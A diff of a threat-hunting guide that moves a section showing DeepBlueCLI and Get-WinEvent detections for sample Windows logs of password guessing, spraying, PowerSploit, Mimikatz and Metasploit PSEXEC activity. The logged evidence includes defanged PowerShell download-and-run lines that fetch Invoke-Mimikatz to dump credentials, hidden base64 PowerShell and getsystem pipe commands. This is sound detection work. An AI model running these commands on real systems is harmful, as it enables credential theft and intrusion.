@@ -327,6 +327,617 @@ You can also check out resources from the Threat Hunting Project here, here
 - [Detecting Lateral Movement in Windows Event Logs](https://github.com/ThreatHuntingProject/ThreatHunting/blob/master/hunts/lateral-movement-windows-authentication-logs.md )
 - [Lateral Movement Detection via Process Monitoring](https://github.com/ThreatHuntingProject/ThreatHunting/blob/master/hunts/lateral_movement_detection_via_process_monitoring.md) 
 
+## Password guessing
+|Event|Command|
+|-----|-------|
+|Password guessing|`.\DeepBlue.ps1 .\evtx\smb-password-guessing-security.evtx`|
+```
+Date    : 9/19/2016 9:50:06 AM
+Log     : Security
+EventID : 4625
+Message : High number of logon failures for one account
+Results : Username: Administrator
+          Total logon failures: 3560
+Command :
+Decoded :
+
+Date    : 9/19/2016 9:50:06 AM
+Log     : Security
+EventID : 4625
+Message : High number of total logon failures for multiple accounts
+Results : Total accounts: 2
+          Total logon failures: 3561
+
+Command :
+Decoded :
+```
+```
+PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\smb-password-guessing-security.evtx"; id=4625} | Measure | Select Count
+
+Count
+-----
+ 3561
+
+TimeCreated  : 9/19/2016 9:52:47 AM
+ProviderName : Microsoft-Windows-Security-Auditing
+Id           : 4625
+Message      : An account failed to log on.
+
+               Subject:
+                Security ID:            S-1-0-0
+                Account Name:           -
+                Account Domain:         -
+                Logon ID:               0x0
+
+               Logon Type:                      3
+
+               Account For Which Logon Failed:
+                Security ID:            S-1-0-0
+                Account Name:           Administrator
+                Account Domain:         .
+
+               Failure Information:
+                Failure Reason:         Unknown user name or bad password.
+                Status:                 0xC000006D
+                Sub Status:             0xC000006A
+
+               Process Information:
+                Caller Process ID:      0x0
+                Caller Process Name:    -
+
+               Network Information:
+                Workstation Name:       uiBfvnfTcIG4xJoi
+                Source Network Address: 192.168.198.149
+                Source Port:            52057
+
+               Detailed Authentication Information:
+                Logon Process:          NtLmSsp
+                Authentication Package: NTLM
+                Transited Services:     -
+                Package Name (NTLM only):       -
+                Key Length:             0
+```
+
+## PSAttack
+|Event|Command|
+|-----|-------|
+|PSAttack|`.\DeepBlue.ps1 .\evtx\psattack-security.evtx`|
+
+Reference:
+- (https://any.run/report/0f4fee7c97e529bd25121467a560716806f2832295fa069a185b405acaee7862/e9eff4d4-98c6-47ad-a8ba-ff6051a63949)
+- (https://www.hybrid-analysis.com/sample/8ade41a6c8af18fde1c390d67d7902acaedc5b94cd12718a214560c4239e2bc7/5a3023a37ca3e10e13006a03)
+
+```
+Date    : 9/20/2016 11:41:27 AM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Resource File To COFF Object Conversion Utility cvtres.exe
+          PSAttack-style command via cvtres.exe
+
+Command : C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\IEUser\AppData\Local\Temp\RES3874.tmp"
+          "c:\Users\IEUser\AppData\Local\Temp\CSC14C61BA389694F5FAB6FBD8E9CFA7CEF.TMP"
+Decoded :
+
+Date    : 9/20/2016 11:41:27 AM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Use of C Sharp compiler csc.exe
+          PSAttack-style command via csc.exe
+
+Command : "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\kwos13rh.cmdline"
+Decoded :
+
+Date    : 9/20/2016 11:33:13 AM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Resource File To COFF Object Conversion Utility cvtres.exe
+          PSAttack-style command via cvtres.exe
+
+Command : C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\IEUser\AppData\Local\Temp\RESB25D.tmp"
+          "c:\Users\IEUser\AppData\Local\Temp\CSCAE981B6C775D478784A2D2A90379D51.TMP"
+Decoded :
+
+Date    : 9/20/2016 11:33:13 AM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Use of C Sharp compiler csc.exe
+          PSAttack-style command via csc.exe
+
+Command : "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\0xqpayvt.cmdline"
+Decoded :
+
+Date    : 9/20/2016 11:28:58 AM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Resource File To COFF Object Conversion Utility cvtres.exe
+          PSAttack-style command via cvtres.exe
+
+Command : C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\IEUser\AppData\Local\Temp\RESCB96.tmp"
+          "c:\Users\IEUser\AppData\Local\Temp\CSCDD7CF7985DD64D48B389AD7A587C926D.TMP"
+Decoded :
+
+Date    : 9/20/2016 11:28:58 AM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Use of C Sharp compiler csc.exe
+          PSAttack-style command via csc.exe
+
+Command : "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\wlqywrdm.cmdline"
+Decoded :
+
+Date    : 9/20/2016 11:27:45 AM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Resource File To COFF Object Conversion Utility cvtres.exe
+          PSAttack-style command via cvtres.exe
+
+Command : C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\IEUser\AppData\Local\Temp\RESADB2.tmp"
+          "c:\Users\IEUser\AppData\Local\Temp\CSC4EC78419D61349E285CD9DBCB3C7409.TMP"
+Decoded :
+
+Date    : 9/20/2016 11:27:44 AM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Use of C Sharp compiler csc.exe
+          PSAttack-style command via csc.exe
+
+Command : "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\g4g34pot.cmdline"
+Decoded :
+```
+
+## Password Spraying
+
+|Event|Command|
+|-----|-------|
+|Password spraying|`.\DeepBlue.ps1 .\evtx\password-spray.evtx`|
+
+```
+Date    : 4/30/2019 12:27:40 PM
+Log     : Security
+EventID : 4648
+Message : Distributed Account Explicit Credential Use (Password Spray Attack)
+Results : The use of multiple user account access attempts with explicit credentials is an indicator of a password
+          spray attack.
+          Target Usernames: gsalinas cdavis lpesce Administrator melliott dpendolino cragoso baker cmoody rbowes
+          jkulikowski jleytevidal tbennett zmathis bgreenwood cspizor wstrzelec drook dmashburn sanson cfleener celgee
+          bhostetler eskoudis kperryman mtoussain thessman bgalbraith ssims psmith jorchilles smisenar bking mdouglas
+          jlake jwright econrad edygert lschifano sarmstrong ebooth
+          Accessing Username: jwrig
+          Accessing Host Name: DESKTOP-JR78RLP
+
+Command :
+Decoded :
+
+Date    : 4/30/2019 12:27:00 PM
+Log     : Security
+EventID : 1102
+Message : Audit Log Clear
+Results : The Audit log was cleared.
+          Account Name: jwrig
+Command :
+Decoded :
+```
+```
+PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\password-spray.ev
+tx"; id=4648} | ForEach-Object {($_.Message -split "`n" | Where-Object {$_ -match "^\s+Account Name:\s+(.+)"}).Trim() -r
+eplace "^\s+Account Name:\s+", ""} | Group-Object | Select Name, Count
+
+Name                         Count
+----                         -----
+Account Name:           jwrig           294
+Account Name:           smisenar         14
+Account Name:           ssims             7
+Account Name:           baker             7
+Account Name:           bgreenwood        7
+Account Name:           mdouglas          7
+Account Name:           bking             7
+Account Name:           bgalbraith        7
+Account Name:           cragoso           7
+Account Name:           cspizor           7
+Account Name:           dmashburn         7
+Account Name:           drook             7
+Account Name:           edygert           7
+Account Name:           jlake             7
+Account Name:           jorchilles        7
+Account Name:           kperryman         7
+Account Name:           melliott          7
+Account Name:           zmathis           7
+Account Name:           wstrzelec         7
+Account Name:           sarmstrong        7
+Account Name:           sanson            7
+Account Name:           lpesce            7
+Account Name:           jleytevidal       7
+Account Name:           econrad           7
+Account Name:           tbennett          7
+Account Name:           gsalinas          7
+Account Name:           jkulikowski       7
+Account Name:           psmith            7
+Account Name:           cmoody            7
+Account Name:           cfleener          7
+Account Name:           ebooth            7
+Account Name:           rbowes            7
+Account Name:           bhostetler        7
+Account Name:           lschifano         7
+Account Name:           mtoussain         7
+Account Name:           cdavis            7
+Account Name:           eskoudis          7
+Account Name:           thessman          7
+Account Name:           celgee            7
+Account Name:           dpendolino        7
+Account Name:           jwright           7
+Account Name:           Administrator     7
+```
+
+## PowerSploit (Security/System)
+|Event|Command|
+|-----|-------|
+|PowerSploit (security)|`.\DeepBlue.ps1 .\evtx\powersploit-security.evtx`|
+|PowerSploit (system)|`.\DeepBlue.ps1 .\evtx\powersploit-system.evtx`|
+
+```
+Date    : 9/20/2016 11:45:48 AM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Download via Net.WebClient DownloadString
+          Command referencing Mimikatz
+
+Command : powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('hXXp://eic[.]me/17'); Invoke-Mimikatz -DumpCreds"
+Decoded :
+
+Date    : 9/20/2016 11:45:24 AM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Download via Net.WebClient DownloadString
+          Command referencing Mimikatz
+          PowerSploit Invoke-Mimikatz.ps1
+          Use of PowerSploit
+
+Command : powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('hxxps://raw[.]githubusercontent[.]com/mattifestat
+          ion/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+=================================================================================
+Date    : 9/20/2016 12:19:26 PM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Long Command Line: greater than 1000 bytes
+          500+ consecutive Base64 characters
+          Base64 encoded and hidden PowerShell command
+          Base64-encoded function
+          Download via Net.WebClient DownloadString
+          User-Agent set via command line
+
+Command : powershell.exe  -NoP -sta -NonI -W Hidden -Enc JABXAGMAPQBOAGUA...EIALQBqAG8AaQBOACcAJwApAA==
+Decoded : $Wc=New-OBJECT ...
+
+Date    : 9/20/2016 12:15:54 PM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Long Command Line: greater than 1000 bytes
+          500+ consecutive Base64 characters
+          Base64 encoded and hidden PowerShell command
+          Base64-encoded function
+          Download via Net.WebClient DownloadString
+          User-Agent set via command line
+
+Command : powershell.exe  -NoP -sta -NonI -W Hidden -Enc WwBTAFk...BPAEkATgAnACcAKQA=
+Decoded : [SYStEm.NET.SErvICePoiNTMANaGEr]::...
+
+```
+```
+PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\powersploit-security.evtx",".\evtx\powersploit-system.evtx"; id=4688} | 
+    Where-Object { $_.Message -ilike "*powershell*" } |
+    Select-Object -ExpandProperty Message
+
+Subject:
+        Security ID:            S-1-5-21-3463664321-2923530833-3546627382-1000
+        Account Name:           IEUser
+        Account Domain:         IE10WIN7
+        Logon ID:               0x6793C
+
+Process Information:
+        New Process ID:         0x11c
+        New Process Name:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Token Elevation Type:   TokenElevationTypeFull (2)
+        Creator Process ID:     0x98c
+        Process Command Line:   powershell.exe  -NoP -sta -NonI -W Hidden -Enc JABXAGM..aQBOACcAJwApAA==
+
+A new process has been created.
+
+Subject:
+        Security ID:            S-1-5-21-3463664321-2923530833-3546627382-1000
+        Account Name:           IEUser
+        Account Domain:         IE10WIN7
+        Logon ID:               0x6793C
+
+Process Information:
+        New Process ID:         0x700
+        New Process Name:       C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        Token Elevation Type:   TokenElevationTypeFull (2)
+        Creator Process ID:     0xf14
+        Process Command Line:   powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('hxxp://eic[.]me/17'); Invoke-Mimikatz -DumpCreds"
+```
+
+## Mimikatz `lsadump::sam`
+
+|Event|Command|
+|-----|-------|
+|Mimikatz `lsadump::sam`|`.\DeepBlue.ps1 .\evtx\mimikatz-privesc-hashdump.evtx`|
+
+```
+Date    : 4/30/2019 11:08:29 AM
+Log     : Security
+EventID : 4673
+Message : Sensititive Privilege Use Exceeds Threshold
+Results : Potentially indicative of Mimikatz, multiple sensitive privilege calls have been made.
+          Username: Sec504
+          Domain Name: SEC504STUDENT
+```
+```
+PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\powersploit-security.evtx",".\evtx\mimikatz-privesc-hashdump.evtx"; id=4673} | fl
+
+TimeCreated  : 4/30/2019 11:08:29 AM
+ProviderName : Microsoft-Windows-Security-Auditing
+Id           : 4673
+Message      : A privileged service was called.
+
+               Subject:
+                Security ID:            S-1-5-21-2977773840-2930198165-1551093962-1000
+                Account Name:           Sec504
+                Account Domain:         SEC504STUDENT
+                Logon ID:               0x1E3DD
+
+               Service:
+                Server: Security
+                Service Name:   -
+
+               Process:
+                Process ID:     0x15a8
+                Process Name:   C:\Tools\mimikatz\mimikatz.exe
+
+               Service Request Information:
+                Privileges:             SeTcbPrivilege
+```
+
+## Metasploit (PSEXEC) Native Target (Security)
+|Event|Command|
+|-----|-------|
+|Metasploit native target (security)|`.\DeepBlue.ps1 .\evtx\metasploit-psexec-native-target-security.evtx`|
+
+With process monitoring, hunt for processes matching these criteria:
+
+- parent process is services.exe
+- process name is cmd.exe
+- command line includes echo AND \pipe\
+
+
+```
+Date    : 9/20/2016 8:41:13 PM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Metasploit-style cmd with pipe (possible use of Meterpreter 'getsystem')
+
+Command : cmd.exe /c echo hgabms > \\.\pipe\hgabms
+Decoded :
+```
+```
+PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\metasploit-psexec-native-target-security.evtx"; id=4688} | fl
+
+
+TimeCreated  : 9/20/2016 8:41:13 PM
+ProviderName : Microsoft-Windows-Security-Auditing
+Id           : 4688
+Message      : A new process has been created.
+
+               Subject:
+                Security ID:            S-1-5-18
+                Account Name:           IE10WIN7$
+                Account Domain:         WORKGROUP
+                Logon ID:               0x3E7
+
+               Process Information:
+                New Process ID:         0x694
+                New Process Name:       C:\Windows\System32\cmd.exe
+                Token Elevation Type:   TokenElevationTypeDefault (1)
+                Creator Process ID:     0x1e8
+                Process Command Line:   cmd.exe /c echo hgabms > \\.\pipe\hgabms
+```
+## Metasploit (PSEXEC) Native Target (System)
+|Event|Command|
+|-----|-------|
+|Metasploit native target (system)|`.\DeepBlue.ps1 .\evtx\metasploit-psexec-native-target-system.evtx`|
+
+Reference:
+- [Hunting for GetSystem in offensive security tools](https://redcanary.com/blog/getsystem-offsec/)
+
+With Windows Event Logs, search for events with the ID 7045 that match these criteria:
+
+- ServiceFileName contains cmd.exe OR %COMSPEC%
+- ServiceFileName contains echo AND \pipe\
+
+```
+Date    : 9/20/2016 8:41:13 PM
+Log     : System
+EventID : 7045
+Message : Suspicious Service Command
+Results : Service name: hgabms
+          Metasploit-style cmd with pipe (possible use of Meterpreter 'getsystem')
+
+Command : cmd.exe /c echo hgabms > \\.\pipe\hgabms
+Decoded :
+
+Date    : 9/20/2016 8:41:02 PM
+Log     : System
+EventID : 7036
+Message : Suspicious Service Name
+Results : Service name: KgXItsbKgTJzdzwl
+          Metasploit-style service name: 16 characters
+
+Command :
+Decoded :
+
+Date    : 9/20/2016 8:41:02 PM
+Log     : System
+EventID : 7045
+Message : New Service Created
+Results : Service name: KgXItsbKgTJzdzwl
+          Metasploit-style service name: 16 characters
+
+Date    : 9/20/2016 8:41:02 PM
+Log     : System
+EventID : 7045
+Message : New Service Created
+Results : Service name: KgXItsbKgTJzdzwl
+          Metasploit-style service name: 16 characters
+
+Command : %SYSTEMROOT%\duKhLYUX.exe
+Decoded :
+
+Date    : 9/20/2016 8:41:02 PM
+Log     : System
+EventID : 7045
+Message : Suspicious Service Command
+Results : Service name: KgXItsbKgTJzdzwl
+```
+```
+PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\metasploit-psexec-native-target-system.evtx"; id=7045,7036} | fl
+
+
+TimeCreated  : 9/20/2016 8:41:13 PM
+ProviderName : Service Control Manager
+Id           : 7045
+Message      : A service was installed in the system.
+
+               Service Name:  hgabms
+               Service File Name:  cmd.exe /c echo hgabms > \\.\pipe\hgabms
+               Service Type:  user mode service
+               Service Start Type:  demand start
+               Service Account:  LocalSystem
+
+TimeCreated  : 9/20/2016 8:41:03 PM
+ProviderName : Service Control Manager
+Id           : 7036
+Message      : The Application Experience service entered the running state.
+
+TimeCreated  : 9/20/2016 8:41:02 PM
+ProviderName : Service Control Manager
+Id           : 7036
+Message      : The KgXItsbKgTJzdzwl service entered the stopped state.
+
+TimeCreated  : 9/20/2016 8:41:02 PM
+ProviderName : Service Control Manager
+Id           : 7036
+Message      : The KgXItsbKgTJzdzwl service entered the running state.
+
+TimeCreated  : 9/20/2016 8:41:02 PM
+ProviderName : Service Control Manager
+Id           : 7045
+Message      : A service was installed in the system.
+
+               Service Name:  KgXItsbKgTJzdzwl
+               Service File Name:  %SYSTEMROOT%\duKhLYUX.exe
+               Service Type:  user mode service
+               Service Start Type:  demand start
+               Service Account:  LocalSystem
+```
+
+## Metasploit PowerShell Target (Security/System)
+|Event|Command|
+|-----|-------|
+|Metasploit PowerShell target (security)|` .\DeepBlue.ps1 .\evtx\metasploit-psexec-powershell-target-security.evtx`|
+|Metasploit PowerShell target (system)|` .\DeepBlue.ps1 .\evtx\metasploit-psexec-powershell-target-system.evtx`|
+
+```
+Date    : 9/20/2016 9:35:58 AM
+Log     : Security
+EventID : 4688
+Message : Suspicious Command Line
+Results : Metasploit-style cmd with pipe (possible use of Meterpreter 'getsystem')
+
+Command : cmd.exe /c echo genusn > \\.\pipe\genusn
+Decoded :
+
+Date    : 9/20/2016 9:35:46 AM
+Log     : System
+EventID : 7045
+Message : Suspicious Service Command
+Results : Service name: UWdKhYTIQWWJxHfx
+          Long Command Line: greater than 1000 bytes
+          Metasploit-style base64 encoded/compressed PowerShell function (possible use of Metasploit PowerShell exploit payload)
+          500+ consecutive Base64 characters
+          Base64-encoded and compressed function
+
+Command : %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden ....
+```
+
+```
+PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\metasploit-psexec-powershell-target-security.evtx",".\evtx\metasploit-psexec-powershell-target-system.evtx"; id=4688,7045} | Where-Object { $_.Message -ilike "*echo*" -or $_.Message -ilike "*cmd.exe*" -or $_.Message -ilike "*COMSPEC*" -or $_.Message -ilike "*\\pipe\\*" } | Format-List
+
+TimeCreated  : 9/20/2016 9:35:58 AM
+ProviderName : Service Control Manager
+Id           : 7045
+Message      : A service was installed in the system.
+
+               Service Name:  genusn
+               Service File Name:  cmd.exe /c echo genusn > \\.\pipe\genusn
+               Service Type:  user mode service
+               Service Start Type:  demand start
+               Service Account:  LocalSystem
+
+TimeCreated  : 9/20/2016 9:35:46 AM
+ProviderName : Service Control Manager
+Id           : 7045
+Message      : A service was installed in the system.
+
+               Service Name:  UWdKhYTIQWWJxHfx
+               Service File Name:  %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden ....
+TimeCreated  : 9/20/2016 9:35:58 AM
+ProviderName : Microsoft-Windows-Security-Auditing
+Id           : 4688
+Message      : A new process has been created.
+
+               Subject:
+                Security ID:            S-1-5-18
+                Account Name:           IE10WIN7$
+                Account Domain:         WORKGROUP
+                Logon ID:               0x3E7
+
+               Process Information:
+                New Process ID:         0xe8c
+                New Process Name:       C:\Windows\System32\cmd.exe
+                Token Elevation Type:   TokenElevationTypeDefault (1)
+                Creator Process ID:     0x1cc
+                Process Command Line:   cmd.exe /c echo genusn > \
+TimeCreated  : 9/20/2016 9:35:46 AM
+ProviderName : Microsoft-Windows-Security-Auditing
+Id           : 4688
+Message      : A new process has been created.
+
+               Subject:
+                Security ID:            S-1-5-18
+                Account Name:           IE10WIN7$
+                Account Domain:         WORKGROUP
+                Logon ID:               0x3E7
+
+               Process Information:
+                New Process ID:         0xb2c
+                New Process Name:       C:\Windows\System32\cmd.exe
+                Token Elevation Type:   TokenElevationTypeDefault (1)
+                Creator Process ID:     0x1cc
+                Process Command Line:   C:\Windows\system32\cmd.exe
+```
+
 ## Windows Log Rotation & Clearing
 If event logs are not forwarded, then they are at risk of being cleared (deleted) or rotated from the endpoint device.
 
@@ -1338,618 +1949,4 @@ Legitimate calls to Add-Type will drop files with prevalence.
    * Parent process: powershell.exe
 2) <DOTNET_FRAMEWORK_DIR>\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:%TEMP%\RES<RANDOM_3_HEX_CHARS>.tmp" "%TEMP%\CSC<RANDOM_32_HEX_CHARS>.TMP"
    * Parent process: csc.exe
-```
-
-
-# Event Monitoring
-
-## Password guessing
-|Event|Command|
-|-----|-------|
-|Password guessing|`.\DeepBlue.ps1 .\evtx\smb-password-guessing-security.evtx`|
-```
-Date    : 9/19/2016 9:50:06 AM
-Log     : Security
-EventID : 4625
-Message : High number of logon failures for one account
-Results : Username: Administrator
-          Total logon failures: 3560
-Command :
-Decoded :
-
-Date    : 9/19/2016 9:50:06 AM
-Log     : Security
-EventID : 4625
-Message : High number of total logon failures for multiple accounts
-Results : Total accounts: 2
-          Total logon failures: 3561
-
-Command :
-Decoded :
-```
-```
-PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\smb-password-guessing-security.evtx"; id=4625} | Measure | Select Count
-
-Count
------
- 3561
-
-TimeCreated  : 9/19/2016 9:52:47 AM
-ProviderName : Microsoft-Windows-Security-Auditing
-Id           : 4625
-Message      : An account failed to log on.
-
-               Subject:
-                Security ID:            S-1-0-0
-                Account Name:           -
-                Account Domain:         -
-                Logon ID:               0x0
-
-               Logon Type:                      3
-
-               Account For Which Logon Failed:
-                Security ID:            S-1-0-0
-                Account Name:           Administrator
-                Account Domain:         .
-
-               Failure Information:
-                Failure Reason:         Unknown user name or bad password.
-                Status:                 0xC000006D
-                Sub Status:             0xC000006A
-
-               Process Information:
-                Caller Process ID:      0x0
-                Caller Process Name:    -
-
-               Network Information:
-                Workstation Name:       uiBfvnfTcIG4xJoi
-                Source Network Address: 192.168.198.149
-                Source Port:            52057
-
-               Detailed Authentication Information:
-                Logon Process:          NtLmSsp
-                Authentication Package: NTLM
-                Transited Services:     -
-                Package Name (NTLM only):       -
-                Key Length:             0
-```
-
-## PSAttack
-|Event|Command|
-|-----|-------|
-|PSAttack|`.\DeepBlue.ps1 .\evtx\psattack-security.evtx`|
-
-Reference:
-- (https://any.run/report/0f4fee7c97e529bd25121467a560716806f2832295fa069a185b405acaee7862/e9eff4d4-98c6-47ad-a8ba-ff6051a63949)
-- (https://www.hybrid-analysis.com/sample/8ade41a6c8af18fde1c390d67d7902acaedc5b94cd12718a214560c4239e2bc7/5a3023a37ca3e10e13006a03)
-
-```
-Date    : 9/20/2016 11:41:27 AM
-Log     : Security
-EventID : 4688
-Message : Suspicious Command Line
-Results : Resource File To COFF Object Conversion Utility cvtres.exe
-          PSAttack-style command via cvtres.exe
-
-Command : C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\IEUser\AppData\Local\Temp\RES3874.tmp"
-          "c:\Users\IEUser\AppData\Local\Temp\CSC14C61BA389694F5FAB6FBD8E9CFA7CEF.TMP"
-Decoded :
-
-Date    : 9/20/2016 11:41:27 AM
-Log     : Security
-EventID : 4688
-Message : Suspicious Command Line
-Results : Use of C Sharp compiler csc.exe
-          PSAttack-style command via csc.exe
-
-Command : "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\kwos13rh.cmdline"
-Decoded :
-
-Date    : 9/20/2016 11:33:13 AM
-Log     : Security
-EventID : 4688
-Message : Suspicious Command Line
-Results : Resource File To COFF Object Conversion Utility cvtres.exe
-          PSAttack-style command via cvtres.exe
-
-Command : C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\IEUser\AppData\Local\Temp\RESB25D.tmp"
-          "c:\Users\IEUser\AppData\Local\Temp\CSCAE981B6C775D478784A2D2A90379D51.TMP"
-Decoded :
-
-Date    : 9/20/2016 11:33:13 AM
-Log     : Security
-EventID : 4688
-Message : Suspicious Command Line
-Results : Use of C Sharp compiler csc.exe
-          PSAttack-style command via csc.exe
-
-Command : "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\0xqpayvt.cmdline"
-Decoded :
-
-Date    : 9/20/2016 11:28:58 AM
-Log     : Security
-EventID : 4688
-Message : Suspicious Command Line
-Results : Resource File To COFF Object Conversion Utility cvtres.exe
-          PSAttack-style command via cvtres.exe
-
-Command : C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\IEUser\AppData\Local\Temp\RESCB96.tmp"
-          "c:\Users\IEUser\AppData\Local\Temp\CSCDD7CF7985DD64D48B389AD7A587C926D.TMP"
-Decoded :
-
-Date    : 9/20/2016 11:28:58 AM
-Log     : Security
-EventID : 4688
-Message : Suspicious Command Line
-Results : Use of C Sharp compiler csc.exe
-          PSAttack-style command via csc.exe
-
-Command : "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\wlqywrdm.cmdline"
-Decoded :
-
-Date    : 9/20/2016 11:27:45 AM
-Log     : Security
-EventID : 4688
-Message : Suspicious Command Line
-Results : Resource File To COFF Object Conversion Utility cvtres.exe
-          PSAttack-style command via cvtres.exe
-
-Command : C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\IEUser\AppData\Local\Temp\RESADB2.tmp"
-          "c:\Users\IEUser\AppData\Local\Temp\CSC4EC78419D61349E285CD9DBCB3C7409.TMP"
-Decoded :
-
-Date    : 9/20/2016 11:27:44 AM
-Log     : Security
-EventID : 4688
-Message : Suspicious Command Line
-Results : Use of C Sharp compiler csc.exe
-          PSAttack-style command via csc.exe
-
-Command : "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\IEUser\AppData\Local\Temp\g4g34pot.cmdline"
-Decoded :
-```
-
-## Password Spraying
-
-|Event|Command|
-|-----|-------|
-|Password spraying|`.\DeepBlue.ps1 .\evtx\password-spray.evtx`|
-
-```
-Date    : 4/30/2019 12:27:40 PM
-Log     : Security
-EventID : 4648
-Message : Distributed Account Explicit Credential Use (Password Spray Attack)
-Results : The use of multiple user account access attempts with explicit credentials is an indicator of a password
-          spray attack.
-          Target Usernames: gsalinas cdavis lpesce Administrator melliott dpendolino cragoso baker cmoody rbowes
-          jkulikowski jleytevidal tbennett zmathis bgreenwood cspizor wstrzelec drook dmashburn sanson cfleener celgee
-          bhostetler eskoudis kperryman mtoussain thessman bgalbraith ssims psmith jorchilles smisenar bking mdouglas
-          jlake jwright econrad edygert lschifano sarmstrong ebooth
-          Accessing Username: jwrig
-          Accessing Host Name: DESKTOP-JR78RLP
-
-Command :
-Decoded :
-
-Date    : 4/30/2019 12:27:00 PM
-Log     : Security
-EventID : 1102
-Message : Audit Log Clear
-Results : The Audit log was cleared.
-          Account Name: jwrig
-Command :
-Decoded :
-```
-```
-PS > Get-WinEvent -FilterHashtable @{Path=".\evtx\password-spray.ev
-tx"; id=4648} | ForEach-Object {($_.Message -split "`n" | Where-Object {$_ -match "^\s+Account Name:\s+(.+)"}).Trim() -r
-eplace "^\s+Account Name:\s+", ""} | Group-Object | Select Name, Count
-
-Name                         Count
-----                         -----
-Account Name:           jwrig           294
-Account Name:           smisenar         14
-Account Name:           ssims             7
-Account Name:           baker             7
-Account Name:           bgreenwood        7
-Account Name:           mdouglas          7
-Account Name:           bking             7
-Account Name:           bgalbraith        7
-Account Name:           cragoso           7
-Account Name:           cspizor           7
-Account Name:           dmashburn         7
-Account Name:           drook             7
-Account Name:           edygert           7
-Account Name:           jlake             7
-Account Name:           jorchilles        7
-Account Name:           kperryman         7
-Account Name:           melliott          7
-Account Name:           zmathis           7
-Account Name:           wstrzelec         7
-Account Name:           sarmstrong        7
-Account Name:           sanson            7
-Account Name:           lpesce            7
-Account Name:           jleytevidal       7
-Account Name:           econrad           7
-Account Name:           tbennett          7
-Account Name:           gsalinas          7
-Account Name:           jkulikowski       7
-Account Name:           psmith            7
-Account Name:           cmoody            7
-Account Name:           cfleener          7
-Account Name:           ebooth            7
-Account Name:           rbowes            7
-Account Name:           bhostetler        7
-Account Name:           lschifano         7
-Account Name:           mtoussain         7
-Account Name:           cdavis            7
-Account Name:           eskoudis          7
-Account Name:           thessman          7
-Account Name:           celgee            7
-Account Name:           dpendolino        7
-Account Name:           jwright           7
-Account Name:           Administrator     7
-```
-
-## PowerSploit (Security/System)
-|Event|Command|
-|-----|-------|
-|PowerSploit (security)|`.\DeepBlue.ps1 .\evtx\powersploit-security.evtx`|
-|PowerSploit (system)|`.\DeepBlue.ps1 .\evtx\powersploit-system.evtx`|
-
-```
-Date    : 9/20/2016 11:45:48 AM
-Log     : Security
-EventID : 4688
-Message : Suspicious Command Line
-Results : Download via Net.WebClient DownloadString
-          Command referencing Mimikatz
-
-Command : powershell.exe  "IEX (New-Object Net.WebClient).DownloadString('hXXp://eic[.]me/17'); Invoke-Mimikatz -DumpCreds"
-Decoded :
